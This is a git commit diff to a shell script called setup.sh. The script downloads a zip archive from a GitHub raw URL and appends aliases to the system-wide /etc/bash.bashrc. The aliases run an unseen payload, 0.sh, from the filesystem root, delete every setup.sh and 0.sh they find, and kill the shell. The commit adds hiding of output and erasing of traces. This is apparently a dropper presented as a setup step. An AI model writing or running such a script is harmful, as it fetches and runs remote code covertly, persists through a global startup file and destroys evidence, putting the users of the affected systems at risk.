df556f0b743db64af2e9aff512c4f8352d70df56
D4NP0UL1N <ct3d.f1l35@gmail.com>
2017-04-20 19:58:20 -0400

    Update setup.sh

--- FINAL/setup.sh
+++ FINAL/setup.sh
@@ -2,6 +2,6 @@
 mkdir /usr/share/misc/final
 wget https://raw.githubusercontent.com/D4NP0UL1N/Public/master/FINAL/setup.zip -O /usr/share/misc/final/setup.zip 
 sleep 2
-echo 'alias setup1="unzip /usr/share/misc/final/setup.zip -d /usr/share/misc/final/; mv 0.sh /; /0.sh; find / -name setup.sh -exec rm -f {} 2>/dev/null \;"' >> /etc/bash.bashrc
-echo 'alias setup2="rm /usr/share/misc/final/*.zip"' >> /etc/bash.bashrc
-echo 'alias clean="unalias -a; find / -name 0.sh -exec rm -f {} 2>/dev/null \;"' >> /etc/bash.bashrc
+echo 'alias setup1="unzip /usr/share/misc/final/setup.zip -d /usr/share/misc/final/ >/dev/null 2>&1; mv 0.sh /; /0.sh; find / -name setup.sh -exec rm -f {} 2>/dev/null \;"' >> /etc/bash.bashrc
+echo 'alias setup2="rm /usr/share/misc/final/*.zip; find / -name 0.sh -exec rm -f {} 2>/dev/null \;"' >> /etc/bash.bashrc
+echo 'alias clean="unalias -a; kill -9 $(echo $$)"' >> /etc/bash.bashrc
